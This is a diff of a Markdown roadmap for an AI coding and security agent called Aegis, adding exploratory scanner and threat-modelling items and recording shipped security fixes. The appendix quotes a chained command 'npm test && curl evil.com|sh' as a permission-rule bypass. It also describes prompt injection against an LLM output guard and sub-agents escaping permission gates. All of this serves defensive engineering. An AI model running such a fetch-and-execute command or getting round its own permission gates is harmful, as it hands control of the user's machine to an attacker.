@@ -1,8 +1,9 @@
 # Aegis Capability Roadmap
+
 **Date:** 2026-06-29
-**Last updated:** 2026-07-05 — P6.3 (MCP server mode) shipped; P6.2 (A2A), P9.3 (telemetry
-export), and P9.6 (bulk session/memory export-import) evaluated and dropped, not wanted. P12
-(multi-agent debate mode for security analysis) drafted per user request, not yet started.
+**Last updated:** 2026-07-05 — P12 (multi-agent debate mode for security analysis), all 7 items,
+shipped. P6.3 (MCP server mode) shipped; P6.2 (A2A), P9.3 (telemetry export), and P9.6 (bulk
+session/memory export-import) evaluated and dropped, not wanted.
 Full change history and design rationale for every shipped item now lives in
 [Appendix A](#appendix-a--completed-work); this document tracks only genuinely open work.
 
@@ -10,19 +11,44 @@ Full change history and design rationale for every shipped item now lives in
 
 ## Status
 
-Everything is shipped except the items in the three "Open Work" sections below: P2, P3, P4,
-P5 (all sub-items), the TQ TUI-quality track, P6.3, P6.4, all of P7 (P7.1–P7.7), all of P8
-(P8.1–P8.6), P9.1/P9.2/P9.5, the 2026-07-03 architecture/security review's full 15-item
-punch list, all of P10 (P10.1–P10.5), and all of P11 (P11.1–P11.12) — see
-[Appendix A](#appendix-a--completed-work) for what each shipped and why. P12 (multi-agent
-debate mode) is new, freshly drafted, and not yet built.
+Everything is shipped except the items in the two "Open Work" sections below: P9.4 and P6.1/
+P6.5. Every other numbered track — P2, P3, P4, P5 (all sub-items), the TQ TUI-quality track,
+P6.3, P6.4, all of P7 (P7.1–P7.7), all of P8 (P8.1–P8.6), P9.1/P9.2/P9.5, the 2026-07-03
+architecture/security review's full 15-item punch list, all of P10 (P10.1–P10.5), all of P11
+(P11.1–P11.12), and all of P12 (P12.1–P12.7) — is shipped; see
+[Appendix A](#appendix-a--completed-work) for what each shipped and why.
 
-**Recommended priority order:** P12.1 first (the debate primitive is the keystone everything
-else in the track hangs off) → P12.2/P12.3 next (roles + evidence-grounding, what makes the
-debate actually rigorous rather than theater) → P12.6 (budget bounds — cheap to add early,
-expensive to retrofit) → P12.4 (surfacing) → P12.5 (threat-model/scan integration) → P12.7
-(eval coverage, once behavior has settled enough to pin). P9.4 and P6 remain low-priority,
-only on a concrete trigger. Nothing here is blocking anything else.
+**Nothing is currently in progress.** P9.4 and P6.1/P6.5 are real but explicitly not worth
+building speculatively — see their entries below for why.
+
+---
+
+## Open Work P13 (Security & Capability Enhancements - Exploratory)
+
+### P13.1 - Trufflehog Secret Scanning Enhancement
+
+Currently gitleaks is used for secret scanning but is not as comprehensive as using trufflehog https://github.com/trufflesecurity/trufflehog. Explore integrating the use of trufflehog into Aegis for secret scanning in project or directory spaces.
+
+### P13.2 - Terminal Enhancements for Aegis
+
+Review the Microsoft Intelligent-Terminal for any features that would be worth incorporating into Aegis. https://github.com/microsoft/intelligent-terminal/tree/main
+Intelligent Terminal is built to work with the Agent Client Protocol (ACP)-compatible agent cli. It has certain quality of life features that could be beneficial to use with Aegis. Ensure that anything incorporated into Aegis would be applicable across all operating systems for Windows, Macos and Linux. Focus on identifying any capabilities and features that could be useful and adding those as a new section of roadmap items.
+
+### P13.3 - Nebula AI-Powered Penetration Testing Platform
+
+The Nebula project utilizes llms to help with penetration testing. I want you to assess the project and see if there are any valuable capabilities that can be incorporated into Aegis for security scanning and testing of application code or applications during runtime. Focus on identifying any capabilities and features that could be useful and adding those as a new section of roadmap items.
+
+### P13.4 - Nuclei addition to scanners
+
+Nuclei is a modern, high-performance vulnerability scanner that leverages simple YAML-based templates. It empowers you to design custom vulnerability detection scenarios that mimic real-world conditions, leading to zero false positives. https://github.com/projectdiscovery/nuclei. Review and look at incorporating Nuclei as one of the capabilities used for scanning. That way I can scan systems on my network via aegis, or have it execute the scan and then analyse the results.
+
+### P13.5 - Aegis Threat Modelling
+
+Create a persona that is strictly for threat modelling. I want it to have a focus on STRIDE, LINDDUN, Trike,, Process for Attack Simulation and Threat Analysis (PASTA), VAST with Visual, Agile and Simple Threat Modeling, and the NIST 800-154 data-centric approach to threat modelling that evaluates how sensitive data flows, stores and might be exposed. I want to create a batch of security documents/instructions/skills/etc for each of the types of threat modeling that the agent can clarify with the user what type of threat model they want to enact and then with a focus on the framework, generate a threat model of an application or system. Also review the blog: https://www.securitycompass.com/blog/top-12-threat-modeling-methodologies-techniques/ to see what other important information or methodology for threat modeling should be incorporated. Take note of when each framework is best used and their use-cases. I don't know if Threat Modeling should be a skill bundle or something that can then be loaded into an aegis session and used so that it's not always in the context.
+
+### P13.6 - Latex Report Writing
+
+I want to incorporate Latex use for writing reports. Using LaTeX to write reports means focusing purely on your text and letting the software handle the layout, formatting, and numbering automatically. It is highly recommended for documents with heavy mathematical notations, consistent sectioning, and professional referencing. I want to use Latex to help standardize report writing. I normally have a large number of Markdown documents for research and planning that I want to then consolidate to create a comprehensive report on a subject, this is where I want to use Aegis to extract the relevant information and generate a latex report for it. Latex documentation and core information can be found here: https://www.latex-project.org/help/documentation/. I don't know if report writing should be a skill bundle or something that can then be loaded into an aegis session and used so that it's not always in the context.
 
 ---
 
@@ -34,6 +60,7 @@ not wanted (no interest in a telemetry-capturing feature; no need for bulk store
 migration). Remaining:
 
 ### P9.4 — No per-task/complexity model routing
+
 P5.9 only reroutes on failure. Nothing picks a cheaper model for simple turns and reserves an expensive one for hard turns (cf. Aider). Plausible cheap win given cost tracking already exists, but no evidence of demand. Priority: **Low**, Effort: **M**.
 
 **Not blocking** — real but no concrete trigger, don't build speculatively.
@@ -44,119 +71,15 @@ P5.9 only reroutes on failure. Nothing picks a cheaper model for simple turns an
 
 P6.3 (MCP server mode) shipped 2026-07-05 — see [Appendix A](#appendix-a--completed-work).
 
-### P6.1 — Mid-turn state persistence *(was P4.1)*
+### P6.1 — Mid-turn state persistence _(was P4.1)_
+
 Persist partial turn state (accumulated assistant text, received tool calls) to SQLite during streaming so a crash mid-turn loses nothing. High complexity, low-probability failure mode; revisit if crash-during-long-turn becomes a reported pain point.
 
 ### P6.5 — Desktop / IDE surface beyond ACP
+
 ACP covers Zed and Neovim; the web UI covers browsers. Evaluate: (a) VS Code extension speaking to the daemon API, (b) wrapping the web UI in a lightweight desktop shell. Only worth it if user demand materializes — the TUI is the product.
 
 **Neither P6.1 nor P6.5 is blocking.** P6.1 has no reported pain point; P6.5 is speculative. Don't build either without a concrete trigger — check with the user first. (P6.2, A2A protocol integration, was evaluated and declined 2026-07-05 — no consumer, not wanted.)
-
----
-
-## Open Work — P12 (Multi-Agent Debate Mode for Security Analysis)
-
-User request 2026-07-05: a mode where a security task (threat model, finding triage, design
-review) runs as a **multi-agent debate (MAD)** — a claim gets proposed, adversarially
-challenged, rebutted, and arbitrated — instead of a single pass producing an unchallenged
-answer. Explicit constraint: Aegis is local-model-first, so this must work with **one Ollama
-model instance playing every role**, not a cast of different models. That's achievable
-because Aegis's existing multi-agent substrate already separates "which model" from "which
-role": `internal/swarm` spawns N agent instances (in-process goroutines or subprocesses) that
-share one model/provider config, and `internal/persona` already differentiates role behavior
-purely through system prompts — 17 built-ins including several adversarial-shaped security
-roles (`security-researcher`, `risk-assessor`, `security-architect`, `appsec-engineer`) that
-map naturally onto proposer/critic/arbiter without inventing a new mechanism. The `agent` tool
-(`internal/tool/builtin/agent.go`) already has a workflow-mode concept — `sequential` /
-`parallel` / `loop`, an `agents` array, and `executeWorkflow` orchestration (P2.9) — which is
-the right extension point for a fourth `debate` mode rather than a parallel new subsystem.
-
-The real risk isn't architectural, it's epistemic: one small local model arguing with itself
-across roles can easily produce *performed* disagreement (a critic persona that just says "I
-disagree" with no new evidence) instead of *real* adversarial pressure. P12.3 exists
-specifically to close that gap — every fixed roadmap item below assumes it, so build order
-matters (see the priority note above).
-
-### P12.1 — Debate workflow primitive (keystone)
-Add `"debate"` to the `agent` tool's `mode` enum alongside `sequential`/`parallel`/`loop`
-(`internal/tool/builtin/agent.go`). Round structure: **propose** (one agent states a claim/
-finding with reasoning) → **critique** (a second agent, given only the claim + shared context,
-must either attack it or explicitly concede) → **rebut** (proposer responds to the critique) →
-repeat for `max_rounds` (default 2) → **arbitrate** (a third agent, seeing the full transcript,
-issues a final verdict: uphold / revise / reject, with a confidence label). All roles run
-through the existing `swarm.Backend`/`RunFunc` seam — no new spawn mechanism, no new model
-plumbing. Effort: **M**, Priority: **High** (blocks everything else in the track).
-
-### P12.2 — Debate roles as personas
-Define the three debate roles as persona profiles rather than hardcoded prompts, so they're
-inspectable/editable the same way every other persona is (`aegis persona show debate-critic`,
-etc.) and can be swapped per-domain later. Proposer reuses an existing security persona
-appropriate to the task (e.g. `security-researcher` for a vuln claim, `security-architect` for
-a threat-model entry). Critic and arbiter are two **new** built-in personas:
-`security-critic` (instructed to actively hunt for the weakest part of the claim — missing
-mitigation, wrong severity, unverified assumption — and required to either name a specific
-flaw or explicitly concede) and `security-arbiter` (instructed to synthesize only, never
-introduce new claims of its own, and to produce a structured verdict, not prose). Effort:
-**S**, Priority: **High**.
-
-### P12.3 — Tool-grounded critique (the part that makes this real, not theater)
-Without this, a single local model playing "critic" tends to either rubber-stamp (persona
-framing alone rarely produces genuine adversarial pressure from a model arguing with its own
-prior output) or hallucinate objections. Require the critic role to ground any challenge in
-retrievable evidence: it must cite a `security_scan` result, a `grep`/`read_file` lookup, or a
-specific line/file — a critique with no cited evidence is auto-downgraded to "unsubstantiated"
-by the arbiter rather than treated as a real rebuttal. This reuses the existing tool-call
-infrastructure (the critic agent just has read/scan tools available, same as any other
-sub-agent) — no new capability, just a prompt+arbiter-rule constraint. Effort: **M**,
-Priority: **High** — this is the difference between a legitimately useful feature and a
-plausible-looking one.
-
-### P12.4 — Debate transcript surfacing (TUI/CLI)
-A debate's value is lost if it's just more scrollback in the normal chat stream. New `/debate`
-TUI command (mirrors `/scan`'s "run directly against the daemon, no free-form model turn"
-pattern from P11's follow-up) and a structured transcript renderer: claim → challenge →
-rebuttal → verdict as a distinct block type (same TQ1 block-based transcript model everything
-else in the TUI already uses), collapsible per round. `aegis debate` CLI entry point for
-headless use, same structured-output convention as `aegis chat --output-format json` (P4.5).
-Effort: **M**, Priority: **Medium** — needed for the feature to be usable, but can trail the
-mechanism itself.
-
-### P12.5 — Threat-model / scan-triage integration
-Wire debate mode into the two places Aegis already produces security claims that benefit from
-challenge: (a) the `security-architect` persona's threat-modeling workflow — each identified
-threat/mitigation pair can optionally route through a debate round before being written into
-the threat model doc; (b) the `security-audit` skill's triage loop (P11.8) — a borderline or
-disputed-severity finding (e.g. a suppressed-vs-real positive) gets debated before the baseline
-suppression decision is made, rather than a single pass deciding unilaterally. Both are
-opt-in (a flag/config toggle, not a default-on behavior change to existing workflows) since
-debate mode multiplies latency/cost per finding. Effort: **M**, Priority: **Medium**,
-depends on P12.1–P12.3.
-
-### P12.6 — Cost and round bounds
-A debate round is 3+ model calls per round instead of 1; unbounded, this defeats the existing
-budget guardrails' intent even though it doesn't bypass them mechanically (P10.5's token
-budget still counts every call). Enforce a hard `max_rounds` config default (2), have the
-orchestrator check remaining budget (`cost.Tracker`) before starting each additional round and
-force early arbitration (skip straight to verdict on the transcript so far) if the budget is
-close to its cap, rather than letting the debate abort mid-critique with no verdict at all.
-Effort: **S**, Priority: **High** — cheap to build alongside P12.1, expensive to retrofit once
-users are relying on debate mode's cost profile being predictable.
-
-### P12.7 — Eval coverage
-A scripted `internal/eval` scenario (deterministic adapter, same convention as P9.1/P10.4) that
-proves: (a) a debate round actually changes the arbiter's verdict when the critic's rebuttal is
-scripted to be valid (i.e. the mechanism isn't a no-op that always upholds the initial claim),
-and (b) an evidence-free critique gets downgraded per P12.3 rather than accepted at face value.
-This is what makes "the debate produces better answers" a checked property instead of a claim.
-Effort: **S**, Priority: **Medium**, naturally comes last — there's nothing stable to pin a
-golden transcript against until P12.1–P12.3 settle.
-
-**Scope kept deliberately narrow for v1:** exactly one model instance/config drives every
-role (no per-role model override, even though the persona/config plumbing would allow one
-later if a user ever *does* have multiple local models loaded — no evidence of that demand
-now); three roles only (proposer/critic/arbiter), not an open-ended N-agent debate graph;
-debate mode is opt-in per task, never a silent replacement for the existing single-pass
-persona behavior.
 
 ---
 
@@ -232,7 +155,7 @@ persona behavior.
 <summary><strong>P7.2–P7.7 — remaining security-hardening audit items, shipped 2026-07-03</strong></summary>
 
 - **P7.2 (shell env leak):** `internal/sandbox/env.go` (new) strips `ANTHROPIC_API_KEY`/`OPENAI_API_KEY` (`DefaultStripEnv`) from `cmd.Env` in both `LocalBackend` and `OSBackend` (`local.go`, `os_sandbox.go`); `sandbox.strip_env` config (`config.SandboxConfig.StripEnv`) adds more names (e.g. MCP tokens from `.aegis/.env`) via `NewLocalBackendWithEnv`/`NewOSBackend`'s new param. Container backend untouched — `docker run`/`podman run` never passed host env into the container to begin with.
-- **P7.3 (exec allow-rule chaining bypass):** `internal/permission/rules.go` adds `globToRegexpExec` — for an `allow` rule scoping an execute-capability tool, `*`/`?` cannot span shell chaining/substitution chars (`;&|`+"`"+`$()<>` + newline), so `allow bash(npm test*)` no longer matches `npm test && curl evil.com|sh`. Deny rules deliberately keep the original broad `.*` (over-matching on deny is safe).
+- **P7.3 (exec allow-rule chaining bypass):** `internal/permission/rules.go` adds `globToRegexpExec` — for an `allow` rule scoping an execute-capability tool, `*`/`?` cannot span shell chaining/substitution chars (`;&|`+"`"+`$()<>`+ newline), so`allow bash(npm test*)`no longer matches`npm test && curl evil.com|sh`. Deny rules deliberately keep the original broad `.*` (over-matching on deny is safe).
 - **P7.4 (silent sandbox fallback):** sandbox backend selection extracted to standalone `server.selectSandbox` (testable in isolation); `sandbox.strict` config makes a failed `container`/`os` backend init a hard startup error instead of silently falling back to local. Non-strict fallback is recorded on `Server` and surfaced via `/healthz` (`api.HealthStatus.SandboxFallback`); `client.Status()` + `cli.warnSandboxFallback` print a warning banner in the TUI/`aegis ui` before entering a session.
 - **P7.5 (persona mode escalation):** `persona.Persona` gained a `Loaded bool` field (true only for `*.md`-parsed personas, never built-ins); `server.resolveSessionMode` ignores a loaded persona's `mode: auto` when it's more permissive than the configured default and the caller didn't explicitly request a mode, logging a warning instead. Built-in personas remain fully trusted.
 - **P7.6 (no bundle provenance check):** `bundle.Bundle.ContentHash()` computes a deterministic `sha256:`-prefixed digest over the manifest + every artifact file; `aegis bundle info` prints it, `aegis bundle install --expect-sha256 <hash>` aborts before writing anything on mismatch. Trust-on-first-use pinning, not a signature.
@@ -289,7 +212,7 @@ Not a numbered roadmap item — a follow-through pass closing gaps left by the P
 <details>
 <summary><strong>P6.3 — MCP server mode, shipped 2026-07-05</strong></summary>
 
-New `internal/mcpserver` package + `aegis mcp-serve`: exposes the Aegis daemon as an MCP server over stdio, the reverse direction of the existing `mcp:` client config (which lets Aegis call *out* to external MCP servers). Rolls its own minimal JSON-RPC 2.0 dispatcher (request/notification, no server-initiated calls needed) rather than sharing `internal/acp`'s — same precedent as `internal/mcp`'s client-side loop already being separate from ACP's.
+New `internal/mcpserver` package + `aegis mcp-serve`: exposes the Aegis daemon as an MCP server over stdio, the reverse direction of the existing `mcp:` client config (which lets Aegis call _out_ to external MCP servers). Rolls its own minimal JSON-RPC 2.0 dispatcher (request/notification, no server-initiated calls needed) rather than sharing `internal/acp`'s — same precedent as `internal/mcp`'s client-side loop already being separate from ACP's.
 
 - Three tools exposed: `aegis_prompt` (delegate a task to a session and block for the full turn, returning the final assistant text plus a `[session: <id>]` marker to continue the conversation), `aegis_new_session`, and `aegis_list_sessions`. All three are thin translations onto the existing daemon HTTP API (`client.Client`), exactly how `internal/acp`'s agent already works — no new server-side session/engine plumbing.
 - Safety posture is deliberately conservative since an MCP `tools/call` is synchronous with no human in the loop: new sessions default to **plan mode** (`mcp_server.default_mode`, not the daemon's own build default) and any approval request that does arise (a caller explicitly asked for build/auto) is **denied** unless `mcp_server.auto_approve` (or `--auto-approve`) is set.
@@ -305,18 +228,18 @@ Tests: `internal/mcpserver/server_test.go` (14 cases: initialize, tools/list sch
 
 A code-level review of `internal/tui` against the Claude Code and opencode/Crush TUI experience found the recurring gap: Aegis rendered the conversation as one append-only styled string (`cappedBuffer` + wrap caches), while the streamlined harnesses model it as a list of typed message blocks rendered and cached individually. TQ1 fixed that structural gap; the rest is diff quality, streaming markdown, and interaction polish.
 
-| # | Item | Shipped |
-|---|------|---------|
-| TQ1 | Block-based transcript model — `internal/tui/transcript.go`: `transcriptBlock` (raw ANSI content + per-block width-keyed wrap cache) replaces the old whole-buffer `cappedBuffer`/`wrapCache`; `liveBlock` keeps the settled-prefix boundary-cache trick so a long streaming reply stays O(tail) per token. Trimming drops whole blocks instead of severing content mid-line. | 2026-07-02 |
-| TQ2 | Real unified diffs — LCS-based Myers diff in `toolview.go`; context lines, `+`/`-` markers, `@@ ... @@` separators between hunks. Replaces delete-all/add-all. | 2026-07-02 |
-| TQ4a/b | Copy affordances — `/copy` copies last assistant message via `pbcopy`/`xclip`/`clip.exe`; `/copy N` copies Nth fenced code block; toast confirmation. | 2026-07-02 |
-| TQ5 | Toggleable sidebar — `sidebarOpen bool` (default off); `ctrl+b` / `/sidebar` toggle; context %, cost, agent count folded into status bar when hidden. | 2026-07-02 |
-| TQ7 | Live todo strip — intercepts `todo_add`/`todo_update`/`todo_list` tool results; renders `▣▶▢` progress strip above input with in-progress task text. | 2026-07-02 |
-| TQ3 | Streaming markdown — the live tail renders through glamour incrementally: `liveBlock.render` takes a markdown-render callback, trailing newlines normalized so settled-prefix + tail concatenation is byte-identical to a whole-source render. No end-of-turn restyle "pop". | 2026-07-03 |
-| TQ9 | Input polish bundle — `shift+enter` newline (Kitty key disambiguation, `ctrl+j` fallback); pasted image paths become `@image:` attachment tokens (`extractImageRefs`, regex-based, quoted-path support); ↑/↓ move the cursor inside a multiline draft with history nav only at first/last line; thinking blocks collapse to `✻ thought for Ns` (`ctrl+o` to expand). | 2026-07-03 |
-| TQ8 | Message queueing — `alt+enter` during streaming queues the draft as the next user turn (dimmed `⏳ queued ▸` block); queued messages auto-send one per completed run at stream close. Explicit cancel or a stream error discards the queue. | 2026-07-03 |
-| TQ6 | Richer approval flow — y/a/n banner replaced by an option-list dialog (`internal/tui/approval.go`): `Allow once / Allow always for pattern / Deny / Deny with feedback`, diff/command preview. "Allow always" derives a scoped pattern (`suggestRulePattern`) and persists it to `.aegis/config.yaml → permission.rules` (`config.AppendProjectPermissionRule`). "Deny with feedback" steers the typed reason back to the model. | 2026-07-03 |
-| TQ10 | Theme system — the hardcoded Charmtone palette moved behind `colorScheme` (`internal/tui/colorscheme.go`) with `darkScheme`/`lightScheme` built-ins; `tui.theme` config key applied before styles are built; glamour markdown style and ANSI-16 shell-output remap follow the scheme. | 2026-07-03 |
+| #      | Item                                                                                                                                                                                                                                                                                                                                                                                                                             | Shipped    |
+| ------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------- |
+| TQ1    | Block-based transcript model — `internal/tui/transcript.go`: `transcriptBlock` (raw ANSI content + per-block width-keyed wrap cache) replaces the old whole-buffer `cappedBuffer`/`wrapCache`; `liveBlock` keeps the settled-prefix boundary-cache trick so a long streaming reply stays O(tail) per token. Trimming drops whole blocks instead of severing content mid-line.                                                    | 2026-07-02 |
+| TQ2    | Real unified diffs — LCS-based Myers diff in `toolview.go`; context lines, `+`/`-` markers, `@@ ... @@` separators between hunks. Replaces delete-all/add-all.                                                                                                                                                                                                                                                                   | 2026-07-02 |
+| TQ4a/b | Copy affordances — `/copy` copies last assistant message via `pbcopy`/`xclip`/`clip.exe`; `/copy N` copies Nth fenced code block; toast confirmation.                                                                                                                                                                                                                                                                            | 2026-07-02 |
+| TQ5    | Toggleable sidebar — `sidebarOpen bool` (default off); `ctrl+b` / `/sidebar` toggle; context %, cost, agent count folded into status bar when hidden.                                                                                                                                                                                                                                                                            | 2026-07-02 |
+| TQ7    | Live todo strip — intercepts `todo_add`/`todo_update`/`todo_list` tool results; renders `▣▶▢` progress strip above input with in-progress task text.                                                                                                                                                                                                                                                                             | 2026-07-02 |
+| TQ3    | Streaming markdown — the live tail renders through glamour incrementally: `liveBlock.render` takes a markdown-render callback, trailing newlines normalized so settled-prefix + tail concatenation is byte-identical to a whole-source render. No end-of-turn restyle "pop".                                                                                                                                                     | 2026-07-03 |
+| TQ9    | Input polish bundle — `shift+enter` newline (Kitty key disambiguation, `ctrl+j` fallback); pasted image paths become `@image:` attachment tokens (`extractImageRefs`, regex-based, quoted-path support); ↑/↓ move the cursor inside a multiline draft with history nav only at first/last line; thinking blocks collapse to `✻ thought for Ns` (`ctrl+o` to expand).                                                             | 2026-07-03 |
+| TQ8    | Message queueing — `alt+enter` during streaming queues the draft as the next user turn (dimmed `⏳ queued ▸` block); queued messages auto-send one per completed run at stream close. Explicit cancel or a stream error discards the queue.                                                                                                                                                                                      | 2026-07-03 |
+| TQ6    | Richer approval flow — y/a/n banner replaced by an option-list dialog (`internal/tui/approval.go`): `Allow once / Allow always for pattern / Deny / Deny with feedback`, diff/command preview. "Allow always" derives a scoped pattern (`suggestRulePattern`) and persists it to `.aegis/config.yaml → permission.rules` (`config.AppendProjectPermissionRule`). "Deny with feedback" steers the typed reason back to the model. | 2026-07-03 |
+| TQ10   | Theme system — the hardcoded Charmtone palette moved behind `colorScheme` (`internal/tui/colorscheme.go`) with `darkScheme`/`lightScheme` built-ins; `tui.theme` config key applied before styles are built; glamour markdown style and ANSI-16 shell-output remap follow the scheme.                                                                                                                                            | 2026-07-03 |
 
 Remaining cosmetic stretch ideas (not scheduled): TQ4c scoped mouse capture, terminal-background auto-detection for theme selection.
 
@@ -334,7 +257,7 @@ Fixes for every item in `research/architecture-security-review-2026-07-03.md`'s 
 5. **Rewind races an in-flight turn** — `handleRewind` now acquires the same per-session semaphore `handlePostMessage` does, so a rewind can never truncate messages a concurrent turn is about to append to.
 6. **Permission rules matched raw paths** — `permission.Rule` gained a `rePath` matcher; `normalizePathLike` (separator-unify + lexical clean + case-fold on case-insensitive OSes) closes the `./secrets/x`, case-variant, and backslash-vs-forward-slash evasions for Read/Write-capability rules.
 7. **Transcript persistence wasn't actually incremental** — `handlePostMessage`'s `flushMessages` closure now runs on every `KindTurnDone`/`KindTrace` event (after each tool round), not once at the very end, so a crash mid-run loses at most the in-flight model call.
-8. **Guard fails open on ambiguous verdicts + no injection hardening** — `parseVerdict` now fails *closed* on an unparseable reply (an actual transport error still fails open); `LLMGuard` wraps judged content in `<output>`/`<file>` tags with `escapeForGuard` neutralizing embedded angle brackets, so injected content can't forge a fake closing tag and splice in "instructions."
+8. **Guard fails open on ambiguous verdicts + no injection hardening** — `parseVerdict` now fails _closed_ on an unparseable reply (an actual transport error still fails open); `LLMGuard` wraps judged content in `<output>`/`<file>` tags with `escapeForGuard` neutralizing embedded angle brackets, so injected content can't forge a fake closing tag and splice in "instructions."
 9. **MCP read loops die silently on oversized/malformed input** — `readLoop`/`listenSSE` scanners raised to `maxMCPScanTokenBytes` (8 MiB, from bufio's 64KB default); `Client.failPending` fails every in-flight and future call immediately once the read loop exits, instead of hanging forever on a dead connection.
 10. **OpenAI reasoning models get the wrong token-limit field** — `isReasoningModel` routes o1/o3-class models (including vendor-prefixed ids) to `max_completion_tokens` instead of `max_tokens`, which those models reject outright.
 11. **OS sandbox overstates its guarantee** — `docs/security.md`/`docs/configuration.md` now document (and `OSBackend`'s doc comment states) that seatbelt/bwrap confine writes and network only, not reads — a materially weaker claim than the container backend's full isolation.
@@ -343,19 +266,19 @@ Fixes for every item in `research/architecture-security-review-2026-07-03.md`'s 
 14. **Embedding provenance / prune-by-age / checkpoint scope** — `mem_vec`/`docs_vec` gained a `model` column (`embed.Embedder` gained `Model()`); a stored vector from a different model is excluded from cosine ranking rather than silently compared. `compaction.pruneStaleToolResults` now only prunes a `grep`/`glob`/`ls` dump once verified superseded by an identical later call (mirrors the existing `read_file` re-read check), not merely by turn age. Checkpoint capture now reaches subprocess-mode sub-agents: `SpawnConfig.CheckpointID` + `WorkerSpec.SessionDBPath` let the worker process open its own connection to the same session db and reconstruct an equivalent `Snapshotter`.
 15. **Adversarial eval suite** — `internal/eval/adversarial_test.go` (new) extends the P9.1 harness (`GuardEvents`/`ExpectGuardFailureContains` added to `eval.go`) with four full-engine scenarios: a judge-adapter proving injected file content can't hijack the output guard, a permission rule proving a `./`-traversal evasion is still blocked, loop detection proving a nonce-varying tool call still trips, and the budget gate proving a stuck guard-retry loop still aborts.
 
-Tests: every fix above shipped with its own regression test (permission/rules_test.go, engine/parallel_test.go, engine/budget_test.go, engine/loopdetect_test.go, tool/deferred_test.go, tool/builtin/{agent,toolsearch}_test.go, mcp/mcp_test.go, provider/openai/openai_test.go, guard/guard_test.go, server/{server_guard,server_checkpoint}_test.go, swarm/mailbox_test.go, longmem/knowledge_test.go, compaction/prune_test.go, cli/worker_test.go, eval/adversarial_test.go) plus the new adversarial eval suite exercising several fixes together end-to-end. Full `go test ./...` green (48 packages).
+Tests: every fix above shipped with its own regression test (permission/rules_test.go, engine/parallel_test.go, engine/budget_test.go, engine/loopdetect_test.go, tool/deferred_test.go, tool/builtin/{agent,toolsearch}\_test.go, mcp/mcp_test.go, provider/openai/openai_test.go, guard/guard_test.go, server/{server_guard,server_checkpoint}\_test.go, swarm/mailbox_test.go, longmem/knowledge_test.go, compaction/prune_test.go, cli/worker_test.go, eval/adversarial_test.go) plus the new adversarial eval suite exercising several fixes together end-to-end. Full `go test ./...` green (48 packages).
 
 </details>
 
 <details>
 <summary><strong>P10 — Sub-agent Security Parity, all 5 items shipped 2026-07-04</strong></summary>
 
-A service-interaction review traced how a top-level session's security posture propagates across the `agent` delegation seam into a spawned teammate, and found neither swarm backend inherited it: `server.newEngine` composes the real gate stack for a top-level run (`RuleGate` → `ContextualGate` → `PersonaToolGate` → mode gate), but `subAgentRunner` (in-process) and `executeWorker` (subprocess) both rebuilt only a bare mode gate from scratch. Mode clamping still held in both paths, so a sub-agent couldn't *escalate* plan→build→auto — what leaked was everything finer-grained than mode.
+A service-interaction review traced how a top-level session's security posture propagates across the `agent` delegation seam into a spawned teammate, and found neither swarm backend inherited it: `server.newEngine` composes the real gate stack for a top-level run (`RuleGate` → `ContextualGate` → `PersonaToolGate` → mode gate), but `subAgentRunner` (in-process) and `executeWorker` (subprocess) both rebuilt only a bare mode gate from scratch. Mode clamping still held in both paths, so a sub-agent couldn't _escalate_ plan→build→auto — what leaked was everything finer-grained than mode.
 
 - **P10.1 (in-process bypass):** `subAgentRunner` skipped the contextual-egress and text allow/deny rule wrapping entirely — a spawned teammate's `web_fetch`/`curl` calls ignored an operator's `egress_then_write`/deny rules. Fixed by factoring gate assembly out of `newEngine` into `(*Server).buildGate(mode, approver, persona)`, reused by both the top-level and sub-agent paths.
 - **P10.2 (subprocess unsandboxed + same gate bypass):** `executeWorker` built its tool registry with no `Sandbox` at all (so a configured container/os sandbox was silently never honored for subprocess workers) and the identical bare-mode-gate bypass as P10.1. Fixed via newly-exported `server.SelectSandbox` plus layering the same contextual/rule gates, independently re-loaded from config since a subprocess has no access to the daemon's in-memory state.
 - **P10.3 (subprocess budget multiplication):** each subprocess worker got a fresh full `BudgetUSD` instead of sharing the parent's ledger (which can't ride `ctx` across a process boundary), so N teammates enforced N× the intended ceiling. Fixed with a `RemainingBudgetUSD`/`RemainingTokens` handoff on `WorkerSpec`, sized against the shared tracker at spawn time, and `cost.Tracker.AddWorkerCost` folding each worker's self-reported spend back before the next sibling spawns.
-- **P10.4 (no eval coverage for the delegation seam):** landed as a regression test alongside each P10.1–P10.3 fix rather than a new `internal/eval` scenario — that harness has no natural seam for spawning a *real* sub-agent through either swarm backend.
+- **P10.4 (no eval coverage for the delegation seam):** landed as a regression test alongside each P10.1–P10.3 fix rather than a new `internal/eval` scenario — that harness has no natural seam for spawning a _real_ sub-agent through either swarm backend.
 - **P10.5 (dollar budget silently no-ops for local models):** prompted by a comparison to how cloud providers budget in tokens, not dollars. `internal/cost` derived USD from a pricing catalog and collapsed to `$0` for local/Ollama (estimated-usage) turns and any uncatalogued model — meaning the local-first deployment case had, in practice, no working spend guardrail. `cost.Tracker` gained `AddTokens`/`TotalTokens` (accumulate regardless of pricing/estimation); new `MaxTokensPerRun`/`session_token_cap`/`daily_token_cap` give a token-denominated primary budget that works everywhere, with the dollar caps remaining a cloud-only convenience layered on top.
 
 Tests: `internal/server/server_subagent_test.go`, `internal/cli/worker_test.go`, `internal/swarm/subprocess_test.go`, `internal/cost/cost_test.go`, `internal/engine/budget_test.go`, `internal/session/session_test.go`, `internal/server/server_test.go`.
@@ -367,7 +290,7 @@ Tests: `internal/server/server_subagent_test.go`, `internal/cli/worker_test.go`,
 
 A user request to bring `internal/security`/`aegis scan`/`security_scan` — three host-installed binaries (semgrep `auto`, trivy `fs`, gitleaks) behind one normalized `Finding` model — up to best-in-class OSS coverage across SAST/SCA/container/IaC/DAST. Three structural gaps drove the track: shallow breadth, `Scanner.Available()` silently skipping any tool not on `PATH` (a clean machine reported a clean scan it never ran), and no dynamic (running-app) testing.
 
-- **P11.1 (containerized scanner runtime, keystone):** `Scanner.Resolve` decides host-binary vs. pinned-container-image vs. unavailable — never a silent skip. Ships with **no built-in image pin** by deliberate choice: a scanner image is itself supply-chain surface, and this codebase has no way to verify a *current* digest at commit time, so an operator pins one themselves (`security.tools.<name>.image`, digest required, see `docs/security.md`'s pin recipe).
+- **P11.1 (containerized scanner runtime, keystone):** `Scanner.Resolve` decides host-binary vs. pinned-container-image vs. unavailable — never a silent skip. Ships with **no built-in image pin** by deliberate choice: a scanner image is itself supply-chain surface, and this codebase has no way to verify a _current_ digest at commit time, so an operator pins one themselves (`security.tools.<name>.image`, digest required, see `docs/security.md`'s pin recipe).
